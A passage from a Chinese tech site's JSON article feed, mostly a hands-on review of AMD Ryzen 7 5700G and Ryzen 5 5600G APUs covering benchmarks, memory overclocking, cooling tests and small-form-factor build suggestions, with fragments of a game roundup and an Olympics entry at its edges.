src=\"https://cdn.sspai.com/2021/08/10/ef7b6487176ba30dcc48347bbe2abd33.jpg\"></figure><p>像素艺术风格的模拟经营游戏，发行商为钟情于像素风格作品的独立游戏发行厂牌 Chucklefish，游戏内容看起来是经典而充实：地球遇险、星际殖民计划启动、搭载人类火种的空间站落成，玩家将扮演管理空间站的人工智能，建设好站内设施、使之高效运转，打理好殖民者的生活需求，处置外来入侵、人员内乱等等事件，总之，最终极的目的就是又快又好地扩大空间站规模、提高人口数量。</p>\n<p>据开发团队自述，该作的核心开发人员仅两名，从 2015 年打磨至今，目前核心的模拟经营机制已构建完成（已于今年初进行过一轮封闭 Beta 测试），接下来的工作将主要聚焦于填充内容，如完善故事剧本、随机事件、定制化要素等；至于何时能推出 1.0 正式版本，开发团队现在的心理预期是再等一年以上。</p>\n<p>以上便是部分本月值得关注的新游简介汇总，个人角度仅供参考，也欢迎大家在评论区分享更多你的体验、信息或思考。同时如果在评论区分享你这个月玩到的好游戏（不一定是新游），8 月 17 日我们将会抽选 1<strong> 位热心分享的读者</strong>各送一张<strong>价值 100 元</strong>的 Steam/PSN/Xbox/eShop 的礼品卡（任选），届时将在本文更新获奖名单。</p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68191"},{"title":"攒机卡在显卡上？AMD 5000G 或许能成为你的新选择","date":"2021-08-10 03:34:42","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<h2><strong>「塞尚」来了</strong></h2>\n<p>今年三月份的时候，AMD 宣布了锐龙 Pro 5000 系列移动处理器，只不过当时主要针对的是 OEM 市场，而后在 Computex 2021 也宣告锐龙 5000G 处理器会登陆零售市场，这次在 ChinaJoy 则发布上市时间，也就是你看到这篇文章的时候。</p>\n<p>这一代锐龙 5000G 处理器，代号「塞尚」Cezanne，基于 7 nm 工艺、采用 Zen 3 CPU 架构和 Vega GPU 架构，针对零售市场首批上市的主要有锐龙 7 5700G 和锐龙 5 5600G 两款型号，分别为 8 核 16 线程及 6 核 12 线程，对比上一代型号核心处理器频率也都有对应提升。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/46ce9434b69925b0566b953ea33d1563\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><p>进入「Zen 架构」，AMD 的 APU 处理器实际已经陆续推出过三代产品，分别是锐龙 2000G 处理器、锐龙 3000G 处理器和锐龙 4000G 处理器，最早的两代产品会比较常见，因为零售市场同步也有销售，但上一代锐龙 4000G 处理器可能因为官方销售策略或者产能因素调整，并没有针对零售市场销售，这也导致一段时间锐龙 4000G 处理器价格居高不下（甚至在Zen3发布后价格依然虚高），这次锐龙 5000G 处理器再次回归零售市场，最直接的影响就是产品定价，首发价格比之前小黄鱼留出的渠道货都便宜了不少。</p>\n<p>锐龙 5000G 处理器内核封装设计其实依旧是延续之前，采用了 CCD+IF 总线+IOD 的组合，当然 CCD 也就是 CPU 内核部分从上一代的 Zen2 升级到了 Zen3，此外 CPU 三级缓存也翻倍提升到 16MB，但 GPU 部分依旧是 VEGA 核显。内核采用这样的设计方案，主要是方便灵活，便于厂商可以快速更新迭代推出新品。而且就内核设计来说，「APU 桌面版」跟「锐龙移动处理器」比较一致，区别主要在于针对不同平台的功耗设置。</p>\n<p>虽然 CPU 都是 Zen3 内核架构，但锐龙 5000 系列台式处理器相比，因为封装设计等因素，两者还是有些区别。比如锐龙 5000G 处理器，内置 VEGA GPU，但仅支持 PCIe3.0 总线，CPU 三级缓存仅为 16MB，内存及 FCLK 超频能力更好；而锐龙 5000 系列台式处理器无内置 GPU，支持 PCIe4.0 总线，CPU三级缓存为 32MB，可以说两者规格差异其实不小，也导致玩法的差异。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/08/2a2bc1c46dc6af233e5bfad09c437587.png\"></figure><p>目前市面除了零售版锐龙 APU 处理器可供选择搭配，其实也有不少 OEM 衍生品，比如基于 APU 的品牌主机或者 SFF\\UCFF 规格主机，甚至包含最近试图引发潮流的 PC 掌机，都是考虑到锐龙 APU 处理器优异的性能及良好的功耗控制而选择的方案。</p>\n<p>前一段时间虽然显卡价格有所回落，但这几天虚拟货币价格又开始大涨，所以未来一段时间内显卡价格估计还是不够稳定，这也导致普通装机消费者会卡在显卡上，而锐龙 APU 处理器刚好就可以解决这个问题，，所以这次会针对锐龙 5000G 处理器的「性能表现」「超频能力」「视频效果」「散热要求」「装机方案」几个方面做一个比较详细的测试及建议。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/947e3ca7095bc8de33fb882537ba6dab\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><h2><strong>01/ 性能表现</strong></h2>\n<p>桌面级的锐龙 5000G APU 产品，基于 7nm 工艺、采用 Zen3 CPU 架构跟 Vega GPU 架构。性能测试部分主要关注锐龙 5000G 的「CPU性能」及「GPU性能」。</p>\n<p><strong>测试平台：</strong></p>\n<ul>\n<li>CPU：锐龙 7 5700G 、锐龙 5 5600G</li>\n<li>主板：微星 B550M MORTAR</li>\n<li>内存：金士顿的 DDR4 4000 8GX2</li>\n<li>SSD：金士顿 NV1 2T</li>\n<li>电源：全汉 Hydro G Pro850</li>\n<li>散热：NOCTUA NH-P1+风扇</li>\n</ul>\n<p>设置说明：主板默认设置，PBO 选项默认（auto），内存频率设置 3200（FCLK 1600）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/94a05b47e65465ad123dad5edcce322e\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><p>「CPU 性能」：抛开频率的细微差异，对比上一代锐龙 4000G，锐龙 5000G 处理器最显著就是 CPU 部分换装 Zen 3 架构，所以 IPC 性能获得提升，处理器的三级缓存翻倍，为1 6MB。</p>\n<p>为方便参照，测试数据加上了 i7 11700及锐龙 7 5800X，方便参考。</p>\n<p>首先是「CPU 基准性能」。实际测试表现来看，锐龙 7 5700G性能对标类似规格的 i7 11700，略低于频率及缓存更高的锐龙 7 5800X，而锐龙 5 5600G 性能则对标 i5 11600 跟锐龙 5 5600X。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/50578deaa013028fc7e9f11d012865be\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><p>「生产力项目」：这边测试了 blender benchmark、corona 1.3 benchmark 和 V-Ray benchmark 三款渲染类软件的基准测试程序。</p>\n<p>blender benchmark、corona 1.3 benchmark 主要测试渲染时长，所以时间越短越好。R7 5700G 跟 i7 11700 渲染耗时基本一样。</p>\n<p>V-Ray benchmark 这边是测试分数，因为是最新版本的，没有之前其它CPU测试数据，所以只能自己对比下。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/ffa5b3f08b191e11bde26dd6a2ac56d6\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><p>PCIe3.0 总线：跟锐龙5000系列移动处理器类似，锐龙 5000G PCIe 依旧是 PCIe3.0，总共 24 条通道。所以与之搭配的存储设备选择 PCIe3.0 设备即可。我这边测试搭配的是金士顿的NV1 2T，就是一款主打性价比的 PCIe3.0 SSD。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/c30a690c5671f2fac692175acb653d39\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><p>「GPU 性能」：GPU 方面，锐龙 7 5700G 内置的是 Vega8，锐龙 5 5700G 内置的是 Vega7，两者区别主要是频率及 GPU 单元核心数量。</p>\n<p>为方便不同平台硬件参照，所以这边内存频率设置为 3200，并没有超频。基准性能表现如下，因为核显架构并没有大变化，所以核显性能提升幅度不大，但依旧是目前市面核显性能最强的处理器。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/b8ed2473af955fb7477937b43980992a\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><p>实际游戏表现如何。我这边测试了绝地求生大逃杀、Dota 2 及彩虹六号三款竞技类游戏，均为 1080P 分辨率 100% 渲染。</p>\n<p>绝地求生大逃杀（低画质）：锐龙 7 5700G 平均 59 帧；锐龙 5 5600G 平均 56 帧</p>\n<p>Dota 2（最高画质）：锐龙 7 5700G 平均 54 帧；锐龙 5 5600G 平均 52 帧</p>\n<p>彩虹六号（中等画质）：锐龙 7 5700G 平均 76 帧；锐龙 5 5600G 平均 71 帧</p>\n<p>银河破裂者（中等画质）：锐龙 7 5700G 平均 44 帧；锐龙 5 5600G 平均 41 帧</p>\n<p>总体而言，如果你偏好 moba 类或者娱乐竞技类游戏，Vega 核显还是可用，对比规格更相近的锐龙5000系列移动处理器，因为不用受限功耗等因素，所以虽然基准性能类似，但实际游戏帧数感觉也会比较平稳。当然 AMD 的显卡，还有另外一个大杀器：FSR</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/cf986902aaa1d917021c17e248540ada\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><p>「FSR加速效果」：就在六月底，AMD FSR （FidelityFX Super Resolution,超级分辨率锐画技术）的也正式上线，而且很厚道的支持大部分显卡，也包含这次发布的锐龙 5000G。</p>\n<p>我这边以银河破裂者+锐龙 7 5700G 为例，在基本一样画面设置情况下，分别测试 FSR 4 档设置超高质量「Ultra Quality」、质量「Quality」、均衡「Balance」以及性能「Performance」，然后看下 FSR 对游戏速度提升在锐龙 5000 系列移动处理器上是否同样有效果。</p>\n<p>实际结果如下，在不同 FSR 档位下，可分别获得58、69、82和97的平均帧，关闭 FSR 则为 44 帧，性能提升幅度可知。所以哪怕 APU 用户，也可以受益 FSR 功能，在画面与速度之间取得一个平衡。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/1f398e96db50eeb6aff83ff7656cc039\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><p>「GPU对生产力应用的影响」：我这边以 Pr+ 锐龙 7 5700G 测试为例，同样的素材及配置设置，开启硬件加速及仅限软件，分别为 5 分 44 秒及 8 分 52 秒，相差近 3 分钟时间。虽然  Vega8 跟更高端的加速效果有一定差距，但还是可以明显看出显卡硬件加速带来的提升。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/a0ec9c508b56f29f77ff7d8693ac274d\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><p>锐龙 7 5700G 的 SPECviewperf 13 显卡专业性能测试成绩，跟早期的独显性能有得一拼了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/c2beff539392bc4cfd606014b2809f16\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><h2><strong>02/ 最适合折腾超频的 ZEN 3 处理器</strong></h2>\n<p>上一代 APU Renoir 虽然没有经过零售渠道销售，但依旧成为少数发烧友的玩物，其主要原因之一就是超强的超频性能，特别是内存跟 FCLK 频率上限，远超同代其它锐龙处理器，所以这次对于锐龙 5000G APU 我也同样期待。</p>\n<p>这次超频部分要测试的主要「CPU 频率」及「内存/ FCLK 频率」，因为这两个频率对性能影响较大，而 GPU 频率一方面目前驱动版本对其已经不支持超频，另外超频增益不大，所以这次就不做测试了。测试的处理器为「锐龙 7 5700G」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/2635c56e79e48a01b97fb1821867a1fc\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><p>「CPU 频率」：我手上这颗大概上限就全核心 4.7G，算是普通体质，多线程成绩对于默认设置情况下略有提升，但这点效益个人建议懒得折腾的人日常开个 PBO 会更省心点。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/2c15bdf977ee2940e2364515ed9e1e2b\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><p>「内存/ FCLK 频率」：对这部分超频期待比较大，结果也超出了我的预期。之前经手折腾过的 ZEN3 处理器，一般 FCLK 频率也就超到 2000 左右就差不多了，但这颗锐龙 7 5700G 几乎没有上限的感觉，可以始终跟内存频率同步直到到内存体质上限。</p>\n<p>最后是超到内存 4533，FCLK 2267。手上测试的这套金士顿 DDR4 4000 是三星的b-die颗粒，（也就是目前的Renegade叛逆者），之前体质上限就是 4500左 右的频率，后续会再用更高频率内存测试下锐龙 5000G APU 的内存上限。</p>\n<p>从上往下依次频率是 3200C14，3600C16，4000C18，4266C18，4400C18，4533C18</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/4f47d0f74c4af1a03d0029aacc3d1ba1\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><p>对核显处理器，内存频率就相当于显存频率了，所以对应的GPU性能也会得到提高。3DMARK 的测试成绩就比默认设置下略高了些。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/90ada4a2b3920c148597ca2469149c9e\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><p>「内存频率对应用的影响」：超内存后除了读写数据更好看还有有什么影响呢，我这边测试了从 3200 频率到最高 4533 的 6 种频率对同样设置情况下彩虹六号游戏帧数的影响。</p>\n<p>这边游戏测试还是用处理器内置的 GPU 测试，如果你是 APU+高端独显的组合，效能影响也会一样，甚至更明显。</p>\n<p>无论是平均帧数还是最高帧基本都随内存频率（ FCLK 分频 1:1 ）提升获得提升。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/2ab31aa22abdf2ba29d0ba75758d3df8\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><p><strong>综上</strong>：跟 APU 的定位有些反差，其实折腾超频的话，APU 可能会比普通的锐龙处理器更好玩，因为目前受限制程热堆积还有本身较高的频率，CPU 频率可玩上限越来越低。但内存及 FCLK 频率反倒成为另外可以影响性能的参数，加上目前APU这部分体质普遍有优势，所以喜欢折腾的用户反倒可以考虑选择 「锐龙 5000G APU」，而且与之搭配的主板，无论是 MATX或者 ITX，可选型号跟可玩性的适配程度都是刚刚好。</p>\n<h2><strong>03/ 是否支持视频插帧？</strong></h2>\n<p>APU 为什么相对保值，有些时候甚至还会涨价，大部分原因大概就是其出色的视频编解码支持，比如大受欢迎的视频补帧（插帧）。</p>\n<p>这次锐龙 5000G APU 核显部分虽然依旧是沿用 GCN 架构的 Radeon RX Vega 核显，让部分游戏党略微失望，但视频党反倒可能更开心，毕竟 GCN 架构目前还是可以支持 BFRC 的插帧。</p>\n<p>我这边也实际测试了下，最新版本的 <a href=\"https://bluesky-soft.com/BlueskyFRC.html\">BFRC 插件</a> 可实现视频插帧（目前已更新至 3.4.2），插帧效果也很好，所以依旧可以算视频利器。</p>\n<p>感兴趣实现方式的用户直接搜索 BFRC+POTPLAYER+视频插帧，这些关键词就可以了解具体设置方式。</p>\n<p>多媒体硬件解码的支持情况</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/9a71a1816f0ff8b7108d7ef8abb607e4\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><h2><strong>04/ 对散热器的要求</strong></h2>\n<p>可能因为默认 TDP 并不高（65W），所以这次无论锐龙 7 5700G 或锐龙 5 5600G 都有附带一颗 Wraith Stealth 原装散热器，考虑到 APU 实际装机会有多种不同的玩法从而针对散热器有不同要求，所以我实际测试了「原装散热器」+「被动散热器」+「中高端散热器」三种方案，根据最终结果，大家可以在装机过程结合自己的需求实际参考选择。</p>\n<p>测试环境：裸机测试，26℃ 空调房，环境自然对流弱。主板默认设置，PBO 设置 auto（默认）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/a5a959fd685d9af08fa7e0c2973b2892\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><p>「原装散热器」：附带的 Wraith Stealth 原装散热器，相信玩家都比较熟悉，9cm 风扇+铝挤散热片，散热器本身的热解能力是比较一般的，一般搭建性价比机型或者部分特别迷你的机型会使用类似散热规格的散热器（比如限高导致）。</p>\n<p>测试结果其实是不错，烤鸡测试锐龙 7 5700G 最终稳定在 82℃<sup class=\"ss-footnote\" href=\"\" title=\"现在大家看网上测试CPU温度，最好还要附带了解CPU实际功率、电压等条件，这些设置实际对温度的影响可能会超过环境，甚至是散热器。\" footnote-id=\"1\">1</sup>，CPU实际功率 70W，转速接近 2000 转，全核心频率 4G；锐龙 5 5600G 最终稳定在 85℃，CPU实际功率 75W，转速接近 2000 转，全核心频率 4.2G。</p>\n<p>主板虽然没有手动开启 PBO，但默认设置下微星还是会自动根据散热器跟环境对处理器尽量优化设置最佳的性能功耗方案，所以实际测试基本都是超过默认 TDP 功耗。「原装散热器」在这种条件下，依靠不高的转速（对于 9cm 风扇来说）跟散热规格（无热管散热器），实现这样的效果已经算可接受，另一方面锐龙 5000G APU 的散热压力也不大，这对于想搭建特殊迷你主机的用户来说也比较好解决散热问题。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/6174debf036906d63a83cab191d22c1a\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><p>「被动散热器：NOCTUA NH-P1」：这次特别测试了被动散热器，一方面是因为猫头鹰 NOCTUA 赶巧近期发布了其首款被动式 CPU 散热器 NH-P1，另一方面也是 APU 装机方案经典玩法之一就是无风扇全被动散热，所以这次也刚好结合测试，方便有类似想法的用户可以参考。</p>\n<p>测试结果，虽然我的测试环境并不特别适合被动散热器（环境对流弱），但两颗处理器都超出预期通过了烤鸡测试，且最终稳定温度均未超过 90℃ 警戒线，也没有降频降功耗：</p>\n<p>锐龙 7 5700G 最终稳定在 85℃，CPU实际功率 72W，全核心频率 4G；锐龙 5 5600G 最终稳定在 82℃，CPU 实际功率 75W，全核心频率 4.2G。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/7b2cfc959cf46ee01b563a134b66eff1\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><p>安装测试说明：NOCTUA NH-P1 虽然是被动式 CPU 散热器，但这类散热器一般建议并不是真的要整机全无风扇。这类散热器最佳使用环境，其实是风道或使用环境有自然对流，从而辅助散热器散热，比如机箱内部安装一枚风扇，机箱有基础的对流风道避免热堆积。</p>\n<p>所以我这次测试的环境虽然是裸机，但因为环境对流非常弱（机子位置并不在出风口），所以对散热器来说并不算理想，但 NOCTUA NH-P1 最终成功压制 8c16t 的锐龙 7 5700G，可以说已经超出预期，不枉 NOCTUA 打磨了多年。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/618bb58196bbba9dbb0d5e185f9d699e\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><p>「中高端风冷散热器：NOCTUA NH-P1+风扇」：加上风扇，NOCTUA NH-P1 就变身高端风冷散热器了，所以我也加上了对应测试，模拟高端风冷的大概散热效果供对比参考。</p>\n<p>测试结果，温度表现自然暴降许多，这种条件下就比较适合折腾超频了：</p>\n<p>锐龙 7 5700G 最终稳定在 64℃，CPU 实际功率 72W，全核心频率 4G；锐龙 5 5600G 最终稳定在 69℃，CPU实际功率 78W，全核心频率 4.2G。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/ef8cbc15882f4e50437603726a2f388c\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><p>综上：官方能附带散热器其实就说明问题了，锐龙 5000G APU 散热压力并不算大。日常使用注意结合主板上的功耗、电压和 PBO 设置即可。</p>\n<h2>05/ 几种装机玩法推荐</h2>\n<p>之前其实就一直在等锐龙 5000G APU 上市好装相关需求的机子，之前也经常有网友咨询过相关方案的建议，这次刚好简单整理下「个人以为」的几种适合搭建 APU 主机搭配推荐。</p>\n<h3>Mini PC</h3>\n<p>这类箱体方案可以理解为可 DIY 版的 NUC，或者说 SFF 主机，相比品牌方案自由度更高，体积相对接近，扩展散热上限也会更好一点。</p>\n<p>银欣 ML10：体积仅为 2.8/3.7 L，但提供多种搭配玩法，支持常规 ITX 主板，对比 DTX、SFF 主板可选配件更丰富，性能上限也更高。电源部分需要AC电源。也是目前一众新箱体里面最适合锐龙 5000G APU 的箱体之一。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/73e2a07f386a0bcc287d63da45b7acae\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><p> </p>\n<p>迎广 B1：之前 APU 的绝配就是迎广肖邦了，不过后面迎广也更新了 B1，除了外观设计不一样，对散热器兼容性也会更好一点，依旧有内置电源，然后支持 ITX 主板。</p>\n<h3>卡式炉机箱</h3>\n<p>传播于表情包，可以说跟 APU 是绝配，更神奇的是实际目前在小黄鱼已经可以买到网友改装好的箱体，如果你喜欢这类风格也不是不可以考虑，就是改装品质不确定。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/f2e03bb286959c30141c2c49529d8c50\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><h3>ITX</h3>\n<p>这边推荐的自然不是常规 ITX 箱体，而是体积控制更紧凑，在常规装机方案可能是劣势但搭配 APU 反倒有优势的箱体，这类箱体体积基本可以控制在 10L 以内（甚至 5L 以内），可以轻松放入书包，往往支持内置电源少了个尾巴，相比上面的方案还会多出一个 PCIe 插槽，可以用于扩展设备（M.2 SSD、采集卡、声卡等）。</p>\n<p>乔思伯 T8：这款 ITX 箱体我发现受欢迎及关注程度超过我预期。经常有网友咨询相关配置建议。T8 如果装独显方案，之前最大的问题可能就是散热，但如果装 APU 的话，这个问题显然就解决了，加上本身有提手的设计（这类迷你主机很多人喜欢有提手），确实挺适合搭建 APU 主机，目前官方也更新了多种猛男配色。</p>\n<p>配件要求 ITX 主板，ATX\\SFX\\SFX-L 电源（建议选 SFX-L），也可支持一块3.5硬盘，大小8.5L。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/d9a738bf3b3ba66299432d8187346217\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><p>乔家一物 BO 100：使用形态有点类似 T8，因为外观及提手设计让不少人印象深刻。其实本身支持 207mm 长度以内的独显，但喜欢这个箱体不少人其实对性能要求不高，加上之前显卡价格还有短卡也不多，所以也可以考虑搭配 APU。本身优势就是散热上限高。</p>\n<p>配件要求 ITX 主板，SFX\\SFX-L 电源，大小约 15L。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/1817f23c24b70c8fe32628a70f2eba76\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><p>工作室作品：目前其它类似及适合的工作室作品 ITX 机箱也挺多，这类箱体在保留一个 PCIE 插槽的同时（一般是短卡或者半高卡），支持内置电源，部分设计也有提手，体积大小可以控制在 5-8L，也是一种选择方向。</p>\n<p>比如 AKLLA A3、机械大师 mc18、鱼巢 S3 和小喆优品 A1 等。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/1409d79ed02d487de8fb899b8aaf2690\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><h3>HTPC+NAS 主机</h3>\n<p>HTPC 算一个比较古早的概念了，因为硬件平台的发展现在 HTPC 其实会更往数播、网播发展，进一步影响装机形态的改变。而本身这类设备对存储也有强大需求，平台性能</p>\n<p>Turemetal UP3\\UP3PRO ：无风扇+零噪音，这样的概念是不是非常吸引人。早期这类全被动散热 HTPC 箱体还是有几款，无奈用户群太少加之产品太贵，愈发少见。Turemetal 也算是目前少有仅存还在做这类箱体的品牌，其中 UP3\\UP3PRO 就特别适合 APU 平台，外观设计也不错，需搭配 ITX 主板跟 DC 电源，官方建议 CPU 功耗 70W（不超过 110 W）也刚好满足锐龙 5000G APU。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/5cdc6d8441773722cb5a87d03136de33\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><p>银欣 SilverStone GD05B：如果你还是有传统类 HTPC 装机需求，可以考虑下银欣这款，也是目前少数几款还在售卧式 HTPC 箱体。支持 MATX 主板 + ATX 电源，配件兼容性较好，散热空间及扩展空间都比较充足，方便后期升级扩展设备。</p>\n<p>银欣 SilverStone CS330：APU+NAS 主机也是一个比较有意思的组合，因为本身数播设备对存储就有较大要求，这类箱体近乎可以提供无限的存储扩展空间，其实也是以前 HTPC 的一个玩法流派，甚至在平时也可以兼顾局域网内的数播解码及存储共享。</p>\n<p>这类玩法首先推荐的就是银欣的 CS330，这款箱体其实是基于经典的 TJ08 改造而成，所以本身散热效能不错，支持 MATX 主板+ ATX 电源，配件兼容性较好装机成本较低，非改装扩展情况下最多可支持 8 块机械硬盘，其中三个是可拔插设计。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/5dae636da46512480059dd836d334d18\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><p>银欣 SilverStone CS381\\CS380：如果 CS330 还不够满足你的话，那么就可以看下这两款更高端的型号了。</p>\n<p>CS380，塔式箱体，支持 ATX 主板+ATX 电源，配件兼容性较好，本身就提供 8 个 3.5 热拔插硬盘位，加上两个光驱位可供改装使用，所以你有海量视频存储需求可以考虑，毕竟这种  ATX 箱体多硬盘稳定性也比较好。</p>\n<p>CS381，卧式箱体设计，支持 ATX 主板+SFX/SFX-L 电源，配件兼容性相对较高，最多支持 12 个硬盘，提供 8 个3.5热拔插，适合搭建高端数播网播主机。</p>\n<p>另外银欣家比较特殊的还有一款 CS01-HS，外观设计比较特别，铝合金壳体。不过是支持2.5英寸设备，有 SAS 或者 SSD 存储需求的可以考虑。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/66255a6b38333050e53713b57775e713\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><p> </p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/8bdb1700f128b40f47924d31bee17f40\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><p>乔思伯 N1：看起来像 V8 改装版，实际小了许多，体积仅为 13L 左右，不过最多可支持 6 硬盘（5x3.5+1x2.5），也保留了一个 PCI 半高扩展位，支持硬盘热拔插，还有前置 Type-C 接口，加上本身可立可卧设计，也是一个不错的数播/NAS 装机选择。</p>\n<p>装机配件需要 ITX 主板+SFX 电源。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/8d476ab4c44a307eabea2593e62c1788\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><p><strong>其它配件说明</strong></p>\n<p>微星 B550M MORTAR：相比更高端平台，锐龙 5000G APU 可以搭配的主板无论是选择范围还是性价比都可以说非常好，比如一众 B550MATX 主板，而其中微星的 B550M MORTAR 更可以说是其代表。介绍什么都不如实测，这次搭配 R7 5700G，直接杀到内存上限，FCLK  频率甚至也可以同步，可以看出微星对这块主板的调教优化。无论是扩展性，供电及超频能力，都是无脑选择，唯一要注意就是能选 WIFI 版就选 WIFI 版，我现在自己用的这块也后悔没选 WIFI 了。</p>\n<p>目前经过一轮降价其实已经比 B450M 更值得购买了（毕竟供电什么也全面升级，还支持前置Type-C）</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/08c87ad6e55a504f3cd19762d51895b7\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><p>全汉 Hydro G Pro850 ：这次用于测试的电源，为 Hydro 系列二代产品，全日系电容，单路 12V 设计，加上 850W，也比较适合目前高端高功耗显卡的配置。看了下还支持全新防潮技术，可在潮湿恶劣环境下使用，过 80PLUS 金牌，提供 10 年质保。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/5d09c6027174de45051bf14aee9b6563\" alt=\"AMD 锐龙5000G APU 玩法攻略\"></figure><p><strong>关联阅读：</strong></p>\n<ul><li><a href=\"https://sspai.com/post/67469\">老显卡也能拥有的新体验：AMD FSR 实测</a></li></ul>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p> </p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68109"},{"title":"2020 东京奥运田径男子 4 x 100 米接力决赛中国队夺得第 4，如何评价本场比赛？","date":"2021-08-06 